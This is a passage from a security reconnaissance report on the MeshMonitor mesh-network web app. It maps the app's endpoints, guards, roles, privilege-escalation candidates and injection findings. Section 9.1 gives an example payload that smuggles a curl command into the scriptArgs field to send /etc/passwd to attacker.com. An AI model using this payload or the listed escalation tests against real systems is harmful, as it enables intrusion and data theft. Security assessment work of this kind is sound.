| Script-Execution | Service | App | Node/Python/Bash | User Data, Config | Executes user-uploaded automation scripts |

### 6.2 Entity Metadata

| Title | Metadata |
|---|---|
| MeshMonitor-Web | Browser: Modern (Chrome/Firefox/Safari); Protocols: HTTPS, WebSocket; Storage: Cookies, LocalStorage, SessionStorage |
| MeshMonitor-App | Hosts: `https://mesh.yeraze.online`; Ports: 443/HTTPS; Endpoints: 200+ REST APIs, WebSocket; Auth: Session cookies, API tokens, OIDC; Dependencies: Database, SessionStore, Meshtastic-Device |
| Database | Engine: SQLite 3 / PostgreSQL 15 / MySQL 8; Exposure: Internal only; Consumers: MeshMonitor-App; Tables: users, permissions, nodes, messages, telemetry, traceroutes, audit_log, api_tokens, sessions |
| SessionStore | Engine: Same as Database or separate sessions.db; Exposure: Internal only; TTL: 30 days default; Cleanup: Every 15 minutes |
| OIDC-Provider | Issuer: Configurable; Protocols: OAuth 2.0, OIDC; Flow: Authorization Code + PKCE; Token Format: JWT; Claims: sub, email, name, preferred_username |
| Meshtastic-Device | Connection: Serial/TCP/Bluetooth; Protocol: Protobuf; Capabilities: Send messages, config management, node database; Admin Channel: Optional with session passkey |
| Push-Service | Protocol: Web Push (RFC 8030); Auth: VAPID; Providers: Browser-specific (FCM for Chrome, APNs for Safari, etc.) |
| Script-Execution | Interpreters: Node.js, Python3, Bash; Timeout: 30 seconds; Environment: Isolated process; Triggers: Auto-responder, Timer, Geofence, HTTP webhook |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|---|---|---|---|---|
| MeshMonitor-Web → MeshMonitor-App | HTTPS | :443 /api/* | None (public endpoints) | Public |
| MeshMonitor-Web → MeshMonitor-App | HTTPS | :443 /api/* | auth:user | PII, Messages |
| MeshMonitor-Web → MeshMonitor-App | HTTPS | :443 /api/admin/* | auth:admin | PII, Config, Secrets |
| MeshMonitor-Web → MeshMonitor-App | HTTPS | :443 /api/users/* | auth:admin | PII, Passwords |
| MeshMonitor-Web → MeshMonitor-App | WebSocket | :443 /socket.io/ | auth:user | PII, Messages, Telemetry |
| MeshMonitor-Web → MeshMonitor-App | HTTPS | :443 /api/v1/* | api-token | PII, Messages (based on token permissions) |
| MeshMonitor-App → Database | TCP | Internal | app-only | PII, Tokens, Messages, Secrets |
| MeshMonitor-App → SessionStore | TCP | Internal | app-only | Sessions, CSRF Tokens |
| MeshMonitor-App → OIDC-Provider | HTTPS | :443 (provider) | tls, pkce | User Identity Claims |
| MeshMonitor-App → Meshtastic-Device | Serial/TCP | Varies | device-connection | Mesh Messages, Config |
| MeshMonitor-App → Script-Execution | Process | Local | auth:user + permission:settings:write | User Data, Triggers |
| MeshMonitor-App → Push-Service | HTTPS | :443 (browser push) | vapid-auth | Push Notifications |
| OIDC-Provider → MeshMonitor-App | HTTPS | :443 /api/auth/oidc/callback | state-validation | ID Token, User Claims |
| Meshtastic-Device → MeshMonitor-App | Serial/TCP | Varies | device-connection | Mesh Packets, Telemetry, Node Updates |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|---|---|---|---|
| auth:user | Auth | Requires a valid authenticated session (any user). Implemented via `requireAuth()` middleware. |
| auth:admin | Authorization | Requires authenticated user with `isAdmin=true`. Implemented via `requireAdmin()` middleware. |
| auth:optional | Auth | Allows both authenticated and anonymous users. Anonymous users get limited permissions. Implemented via `optionalAuth()`. |
| api-token | Auth | Requires valid Bearer token in Authorization header. Used for v1 API. Implemented via `requireAPIToken()`. |
| permission:resource:action | Authorization | Requires specific resource permission (e.g., nodes:write, messages:read). Admins bypass. Implemented via `requirePermission(resource, action)`. |
| ownership:user | ObjectOwnership | User can only access their own resources (e.g., own API tokens, own preferences). Verified by userId comparison. |
| ownership:self-protection | ObjectOwnership | Users cannot delete themselves or remove their own admin privileges. Explicit checks in user management endpoints. |
| ownership:last-admin-protection | ObjectOwnership | Cannot delete the last active admin user. Prevents lockout. Checked before user deletion. |
| ownership:anonymous-protection | ObjectOwnership | Cannot delete the special 'anonymous' user account. System protection. |
| channel:permission | Authorization | Access to channel data requires specific channel permission (channel_0 through channel_7). Dynamically checked based on channel number. |
| csrf:token | Protocol | CSRF token validation for state-changing requests. Uses double-submit cookie pattern. Exempt: GET requests, API token auth, whitelisted endpoints. |
| rate-limit:auth | RateLimit | Strict rate limiting on authentication endpoints (5 requests per 15 minutes). Prevents brute force. |
| rate-limit:api | RateLimit | General API rate limiting (1000 requests per 15 minutes per IP). Applied to all /api/* routes. |
| rate-limit:message | RateLimit | Message sending rate limiting. Prevents spam. |
| device-connection | Network | Requires active connection to Meshtastic device. Checked before device operations. |
| app-only | Network | Database and session store only accessible by application server. Not exposed to network. |
| tls | Protocol | HTTPS/TLS encryption for all external communication. |
| pkce | Protocol | Proof Key for Code Exchange used in OIDC flow. Prevents authorization code interception. |
| state-validation | Protocol | OAuth state parameter validation to prevent CSRF in OAuth flow. |
| vapid-auth | Protocol | VAPID authentication for Web Push notifications. Uses public/private key pair. |

## 7. Role & Privilege Architecture

### 7.1 Discovered Roles

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|---|---|---|---|
| anon (anonymous) | 0 | Global | Special user account with username 'anonymous'. Read-only access to limited resources. `/repos/meshmonitor/src/services/database.ts:8668-8719` |
| user | 1 | Global | Base authenticated user role. Subject to granular permissions. `isAdmin=false` in users table. |
| admin | 10 | Global | Full system administration. Bypasses all permission checks. `isAdmin=true` in users table. `/repos/meshmonitor/src/types/auth.ts:7-24` |

**Note:** The application uses a simple two-tier hierarchy (admin vs. user) with granular permissions controlling access within the user tier.

### 7.2 Privilege Lattice

```
Privilege Hierarchy (→ means "can access resources of"):

anon (anonymous) → [limited subset of user resources]
user → [resources based on permissions]
admin → [all resources, bypasses all permission checks]

Permission-Based Access (within user role):
├─ dashboard:read → View dashboard
├─ nodes:read/write → Manage nodes
├─ channel_0:read/write → Access channel 0 (admin channel)
├─ channel_1-7:read/write → Access channels 1-7
├─ messages:read/write → Direct messages
├─ settings:read/write → Application settings
├─ configuration:read/write → Device configuration
├─ info:read/write → Network information
├─ traceroute:read/write → Traceroute operations
├─ automation:read/write → Announcements
├─ connection:read/write → Device connection control
├─ audit:read/write → Audit logs
├─ security:read/write → Security scanner
├─ themes:read/write → Theme management
├─ nodes_private:read → Private node information
└─ meshcore:read/write → MeshCore integration

Key Authorization Rules:
1. admin role ALWAYS bypasses permission checks (line 138-140 in authMiddleware.ts)
2. Regular users require explicit permission grants for each resource
3. Anonymous user has hardcoded limited permissions (dashboard, nodes, info - read only)
4. No role switching or temporary elevation mechanisms exist
```

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|---|---|---|---|
| anon | `/` | `/`, `/login`, limited read-only API access | None (no authentication) |
| user | `/` (map view) | All authenticated routes based on permissions | Session cookie OR API token |
| admin | `/` (map view) | All routes including `/api/users/*`, `/api/admin/*` | Session cookie OR API token |

**Note:** There is no dedicated admin dashboard. Admins access an "Admin" menu item within the main application interface.

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|---|---|---|---|
| anon | None (optionalAuth returns anonymous user) | Hardcoded permissions in createAnonymousUser() | users table, username='anonymous' |
| user | requireAuth() | Database query to permissions table | users table, isAdmin=false + permissions table |
| admin | requireAuth() + requireAdmin() | Bypassed (line 138-140 in authMiddleware.ts) | users table, isAdmin=true |

**Permission Resolution Code:**
- File: `/repos/meshmonitor/src/server/auth/authMiddleware.ts:224-232`
```typescript
async function hasPermission(user: User, resource: string, action: 'viewOnMap' | 'read' | 'write'): Promise<boolean> {
  if (user.isAdmin) return true;  // Admin bypass
  const permission = await databaseService.getUserPermissionAsync(user.id, resource);
  if (!permission) return false;
  return permission[action] === true;
}
```

## 8. Authorization Vulnerability Candidates

This section identifies specific endpoints that are prime candidates for authorization testing, organized by vulnerability type.

### 8.1 Horizontal Privilege Escalation Candidates

Ranked list of endpoints with object identifiers that could allow access to other users' resources.

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity | Location |
|---|---|---|---|---|---|
| **HIGH** | `/api/messages/:id` DELETE | id (message ID) | messages | User messages | `/repos/meshmonitor/src/server/routes/messageRoutes.ts:81` |
| **HIGH** | `/api/messages/direct/:nodeId1/:nodeId2` GET | nodeId1, nodeId2 | direct_messages | Private DMs | `/repos/meshmonitor/src/server/server.ts:1807` |
| **HIGH** | `/api/messages/channel/:channel` GET | channel (0-7) | channel_messages | Channel messages | `/repos/meshmonitor/src/server/server.ts:1770` |
| **HIGH** | `/api/nodes/:nodeId/position-history` GET | nodeId | position_data | Location tracking | `/repos/meshmonitor/src/server/server.ts:795` |
| **MEDIUM** | `/api/nodes/:nodeId/favorite` POST | nodeId | favorites | User preferences | `/repos/meshmonitor/src/server/server.ts:916` |
| **MEDIUM** | `/api/nodes/:nodeId/ignored` POST | nodeId | ignored_list | User preferences | `/repos/meshmonitor/src/server/server.ts:1057` |
| **MEDIUM** | `/api/nodes/:nodeId/position-override` POST/DELETE | nodeId | position_override | Location manipulation | `/repos/meshmonitor/src/server/server.ts:1312,1419` |
| **MEDIUM** | `/api/channel-database/:id` GET/PUT/DELETE | id (channel DB ID) | channel_keys | Encryption keys | `/repos/meshmonitor/src/server/routes/channelDatabaseRoutes.ts` |
| **MEDIUM** | `/api/telemetry/:nodeId` GET | nodeId | telemetry | Device metrics | `/repos/meshmonitor/src/server/server.ts:3167` |
| **LOW** | `/api/ignored-nodes/:nodeId` DELETE | nodeId | ignored_list | User preferences | `/repos/meshmonitor/src/server/server.ts:1214` |

**Testing Notes:**
- All channel-based endpoints (channel/:channel) should be tested for cross-channel access
- Node-specific endpoints may allow access to nodes the user shouldn't see based on channel permissions
- Message endpoints are high-value targets as they contain user communications

### 8.2 Vertical Privilege Escalation Candidates

List of endpoints that require higher privileges, organized by target role.

#### Admin-Only Endpoints (Escalation Target: admin role)

| Endpoint Pattern | Functionality | Risk Level | Location |
|---|---|---|---|
| `/api/users/*` (ALL methods) | User management (create, update, delete, permissions) | **CRITICAL** | `/repos/meshmonitor/src/server/routes/userRoutes.ts` |
| `/api/users/:id/admin` PUT | Toggle admin status for any user | **CRITICAL** | `/repos/meshmonitor/src/server/routes/userRoutes.ts:295` |
| `/api/users/:id/permissions` PUT | Modify user permissions | **CRITICAL** | `/repos/meshmonitor/src/server/routes/userRoutes.ts:423` |
| `/api/users/:id/mfa` DELETE | Force-disable MFA for any user | **HIGH** | `/repos/meshmonitor/src/server/routes/userRoutes.ts:633` |
| `/api/admin/commands` POST | Execute admin commands on device | **CRITICAL** | `/repos/meshmonitor/src/server/server.ts:7183` |
| `/api/admin/import-config` POST | Import device configuration | **HIGH** | `/repos/meshmonitor/src/server/server.ts:7035` |
| `/api/admin/export-config` POST | Export device configuration | **MEDIUM** | `/repos/meshmonitor/src/server/server.ts:6906` |
| `/api/channel-database/*` (admin ops) | Manage encryption key database | **HIGH** | `/repos/meshmonitor/src/server/routes/channelDatabaseRoutes.ts` |
| `/api/audit/*` | View and manage audit logs | **MEDIUM** | `/repos/meshmonitor/src/server/routes/auditRoutes.ts` |
| `/api/push/vapid-subject` PUT | Configure push notifications | **LOW** | (push routes) |

#### Permission-Based Escalation Candidates

| Resource Permission | Target Functionality | Risk Level | Bypass Check |
|---|---|---|---|
| `settings:write` | Modify application settings, upload scripts | **HIGH** | Test if permission check can be bypassed |
| `configuration:write` | Device configuration, reboot device | **HIGH** | Test for permission elevation |
| `channel_0:write` | Admin channel access and modification | **HIGH** | Test cross-channel access |
| `messages:write` | Send messages, delete messages | **MEDIUM** | Test message injection |
| `nodes:write` | Modify node data, favorites, overrides | **MEDIUM** | Test unauthorized node modification |
| `security:write` | Trigger security scans | **LOW** | Test unauthorized scanning |
| `audit:write` | Cleanup audit logs | **MEDIUM** | Test audit log manipulation |

**Key Testing Scenarios:**
1. Attempt admin-only operations without admin role
2. Test if regular user can self-promote to admin via `/api/users/:id/admin`
3. Test if permission checks can be bypassed with parameter manipulation
4. Test if admin bypass logic has edge cases

### 8.3 Context-Based Authorization Candidates

Multi-step workflow endpoints that assume prior steps were completed.

| Workflow | Endpoint | Expected Prior State | Bypass Potential | Location |
|---|---|---|---|---|
| MFA Setup | `/api/mfa/verify-setup` POST | MFA secret generated via `/api/mfa/setup` | Could user verify without setup? | `/repos/meshmonitor/src/server/routes/mfaRoutes.ts:87` |
| MFA Login | `/api/auth/verify-mfa` POST | `pendingMfaUserId` in session from login | Could attacker complete MFA for another user? | `/repos/meshmonitor/src/server/routes/authRoutes.ts:320` |
| OIDC Callback | `/api/auth/oidc/callback` GET | State parameter from `/api/auth/oidc/login` | Could attacker manipulate state to hijack flow? | `/repos/meshmonitor/src/server/routes/authRoutes.ts:475` |
| Script Execution | Script triggers fire | Script uploaded via `/api/scripts/import` | Could attacker trigger execution of other users' scripts? | `/repos/meshmonitor/src/server/server.ts` (trigger logic) |
| Device Commands | `/api/admin/commands` POST | Active device connection | Could commands be sent without connection? | `/repos/meshmonitor/src/server/server.ts:7183` |

**Testing Notes:**
- Test workflow step skipping (e.g., verify MFA without setup)
- Test session/state manipulation to hijack multi-step processes
- Test race conditions in workflow state

### 8.4 Self-Protection Bypass Candidates

Endpoints with self-protection mechanisms that could potentially be bypassed.

| Protection Mechanism | Endpoint | Protection Check | Bypass Vector | Location |
|---|---|---|---|---|
| Cannot delete self | `/api/users/:id` DELETE | `if (userId === req.user.id)` | Test with modified userId in session | `/repos/meshmonitor/src/server/routes/userRoutes.ts:181` |
| Cannot remove own admin | `/api/users/:id/admin` PUT | `if (userId === req.user.id && !isAdmin)` | Test session manipulation | `/repos/meshmonitor/src/server/routes/userRoutes.ts:312` |
| Cannot delete last admin | `/api/users/:id` DELETE (when admin) | Count active admins, prevent if last | Test race condition with multiple deletions | `/repos/meshmonitor/src/server/routes/userRoutes.ts:250-264` |
| Cannot delete anonymous | `/api/users/:id` DELETE | `if (user.username === 'anonymous')` | Test with modified username | `/repos/meshmonitor/src/server/routes/userRoutes.ts:244` |

## 9. Injection Sources (Command Injection, SQL Injection, LFI/RFI, SSTI, Path Traversal, Deserialization)

**Network Surface Focus:** Only injection sources in network-accessible code paths are included. Local-only scripts, CLI tools, and build utilities are excluded.

### 9.1 Command Injection Sources

#### **CONFIRMED VULNERABILITY: Script Argument Injection**

**Vulnerability Type:** Command Injection via unsanitized script arguments

**Affected Endpoints:**
- `POST /api/settings` (with autoResponderTriggers, timerTriggers, or geofenceTriggers configuration)

**Data Flow:**
1. **User Input:** JSON body with trigger configuration including `scriptArgs` field
   - File: `/repos/meshmonitor/src/server/server.ts:4885`
   - Example: `{"autoResponderTriggers": [{"scriptPath": "/data/scripts/test.sh", "scriptArgs": "; malicious_command"}]}`

2. **Validation Applied:**
   - Script path validated: Must start with `/data/scripts/`, cannot contain `..`, must have whitelisted extension
   - Files: Lines 5079-5091 (auto-responder), 5128-5138 (timer), 5235-5244 (geofence)
   - **scriptArgs field NOT sanitized**

3. **Dangerous Sink:** Arguments passed to `execFileAsync`
   - Auto-responder execution: `/repos/meshmonitor/src/server/meshtasticManager.ts:8433`
   - Timer execution: `/repos/meshmonitor/src/server/meshtasticManager.ts:2211`
   - Geofence execution: `/repos/meshmonitor/src/server/meshtasticManager.ts:1967`
   - Code pattern:
     ```typescript
     const scriptArgsList = this.parseScriptArgs(trigger.scriptArgs);
     const { stdout, stderr } = await execFileAsync(interpreter, [resolvedPath, ...scriptArgsList], {...});
     ```

4. **Attack Vector:**
   - User with `settings:write` permission configures trigger with malicious `scriptArgs`
   - When trigger fires, arguments are passed to shell script/Python/Node interpreter
   - Depending on how the called script processes arguments, shell metacharacters could be exploited

**Risk Level:** **MEDIUM**
- Requires authentication
- Requires `settings:write` permission
- Exploitation depends on how target scripts handle arguments
- Limited by 30-second timeout and maxBuffer

**Example Exploit:**
```json
POST /api/settings
{
  "autoResponderTriggers": [{
    "trigger": "test",
    "responseType": "script",
    "response": "/data/scripts/echo.sh",
    "scriptArgs": "; curl http://attacker.com/exfiltrate?data=$(cat /etc/passwd)"
  }]
}
```

### 9.2 SQL Injection Sources

**Result:** **NO VULNERABILITIES FOUND**

**Analysis:**
- All database operations use Drizzle ORM with parameterized queries
- SQL `tagged template literals` automatically parameterize values
- Example: `/repos/meshmonitor/src/db/repositories/notifications.ts:623`
  ```typescript
  await db.execute(sql`
    INSERT INTO read_messages ("messageId", "userId", "readAt")
    SELECT id, ${effectiveUserId}, ${now} FROM messages
    WHERE channel = ${channelId} ...
  `);
  ```
- No raw SQL string concatenation found in codebase
- SQLite uses prepared statements via better-sqlite3
- PostgreSQL and MySQL use parameterized queries via Drizzle

**Files Reviewed:**
- All repository files in `/repos/meshmonitor/src/db/repositories/`
- All route handlers
- Database service files

### 9.3 Path Traversal/LFI/RFI Sources

**Result:** **NO CRITICAL VULNERABILITIES FOUND** (Protections in place)

**Analysis:**

1. **Script Path Validation (Protected):**
   - Files: `/repos/meshmonitor/src/server/server.ts` lines 5081-5086, 5129-5134, 5235-5240
   - Validation: Must start with `/data/scripts/`, cannot contain `..`, extension whitelist
   - Path traversal attempts rejected

2. **Script Content Proxy (Protected):**
   - File: `/repos/meshmonitor/src/server/routes/scriptContentRoutes.ts:8-159`
   - Validation: Only allows `raw.githubusercontent.com` hostname
   - Validates GitHub path format
   - Rejects path traversal (`../`, `..\\`, `/..`, `\\..`)
   - Max path length: 200 characters

3. **Script Filename (Protected):**
   - File: `/repos/meshmonitor/src/server/server.ts:9020`
   - Sanitization: `path.basename()` removes directory components
   - Extension whitelist: `.js`, `.mjs`, `.py`, `.sh`

4. **Script Deletion (Potential Risk - Lower Priority):**
   - File: `/repos/meshmonitor/src/server/server.ts:9102`
   - Endpoint: `DELETE /api/scripts/:filename`
   - Uses `path.basename()` but worth testing for bypasses

**Risk Level:** **LOW** (Protections appear adequate but should be tested)

### 9.4 Server-Side Template Injection (SSTI) Sources

**Result:** **NO VULNERABILITIES FOUND**

**Analysis:**
- No server-side template engines (Pug, EJS, Handlebars, Nunjucks) found in dependencies
- No `render()` or `compile()` calls on user-controlled input
- All dynamic content generated via string concatenation or JSON responses
- React used on frontend (client-side rendering only)

### 9.5 Deserialization Sources

**Result:** **NO VULNERABILITIES FOUND**

**Analysis:**
- All `JSON.parse()` calls operate on trusted data sources (database-stored values)
- Examples:
  - MFA backup codes: Parsing user's own stored codes
  - Traceroute data: Parsing database JSON columns
  - Configuration: User-submitted JSON validated before processing
- No unsafe deserialization libraries (pickle, YAML.load, unserialize, etc.)
- No protobuf deserialization on untrusted input (device-to-server protobuf is expected)

### 9.6 Summary of Injection Findings

| Injection Type | Vulnerabilities Found | Risk Level | Affected Endpoints |
|---|---|---|---|
| **Command Injection** | 1 (scriptArgs) | **MEDIUM** | `POST /api/settings` |
| SQL Injection | 0 | None | N/A |
| Path Traversal | 0 (protections in place) | Low | Script paths (protected) |
| SSTI | 0 | None | N/A |
| Deserialization | 0 | None | N/A |

**Critical Recommendation:**
Sanitize or use an allowlist for the `scriptArgs` field in auto-responder, timer, and geofence trigger configurations to prevent command injection via script arguments.

---

## RECONNAISSANCE COMPLETE

This comprehensive reconnaissance deliverable provides complete attack surface intelligence for the MeshMonitor application. All subsequent analysis specialists (Injection, XSS, Auth, SSRF, Authz) have the necessary information to conduct targeted vulnerability analysis based on this foundational research.

**Key Findings Summary:**
- 200+ API endpoints mapped with authorization details
- Two-tier role model (admin/user) with 27+ granular permissions
- 1 confirmed command injection vulnerability (scriptArgs field)
- No SQL injection vulnerabilities (ORM protection)
- Strong authentication with MFA and OIDC support
- Multiple IDOR candidates identified for authorization testing
- Script upload and execution capabilities present (high-risk feature)

**Deliverable Location:** `/repos/meshmonitor/deliverables/recon_deliverable.md`

